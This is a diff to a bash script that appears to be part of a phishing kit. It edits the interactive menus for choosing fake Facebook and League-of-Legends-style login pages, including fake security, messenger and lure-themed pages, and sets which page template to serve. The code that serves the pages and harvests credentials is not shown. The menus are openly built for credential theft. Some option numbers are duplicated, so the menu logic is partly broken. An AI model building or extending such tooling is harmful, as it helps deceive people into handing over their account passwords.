@@ -388,30 +388,30 @@ printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illeg
 printf "\n"
 }
 
-facebook(){
+lol(){
 banner
 printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake mobile Security Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Mobile Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m create account Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Lol modern Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Lol old login Page\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option
 
-if [[ $fb_option == 1 || $fb_option == 01 ]]; then
-server="face_desk"
+if [[ $lol_option == 1 || $lol_option == 01 ]]; then
+server="lol"
 start
 
-elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
-server="face_deskStat"
+elif [[ $lol_option == 2 || $lol_option == 02 ]]; then
+server="createLOL"
 start
 
-elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
-server="face_mobSec"
+elif [[ $lol_option == 3 || $lol_option == 03 ]]; then
+server="lol"
 start
 
-elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
-server="face_moobileP"
+elif [[ $lol_option == 4 || $lol_option == 04 ]]; then
+server="lol"
 start
 
 else
@@ -423,7 +423,7 @@ fi
 
 }
 
-lol(){
+facebook(){
 banner
 printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
@@ -431,37 +431,39 @@ printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account\e[0m
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake mobile Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Fake statics Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Fake lana holes Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Fake messenger Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake advanced Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake lana holes Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake mia khalifa Page\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
-if [[ $fb_option == 1 || $lol_option == 01 ]]; then
-server="lol"
+if [[ $fb_option == 1 || $fb_option == 01 ]]; then
+server="facebook"
 start
 
-elif [[ $fb_option == 2 || $lol_option == 02 ]]; then
-server="createLOL"
+elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
+server="face_desk"
 start
 
-elif [[ $fb_option == 3 || $lol_option == 03 ]]; then
-server="lol"
+elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
+server="face_deskStat"
 start
 
-elif [[ $fb_option == 4 || $lol_option == 04 ]]; then
-server="lol"
+elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
+server="fb_sec"
 start
 
-elif [[ $fb_option == 5 || $lol_option == 05 ]]; then
-server="lol"
+elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
+server="lb_adv"
 start
 
-elif [[ $fb_option == 6 || $lol_option == 06 ]]; then
-server="lol"
+elif [[ $fb_option == 6 || $fb_option == 06 ]]; then
+server="fb_msg"
 start
 
-elif [[ $fb_option == 7 || $lol_option == 07 ]]; then
-server="lol"
+elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
+server="fb_lana"
 start
 
 
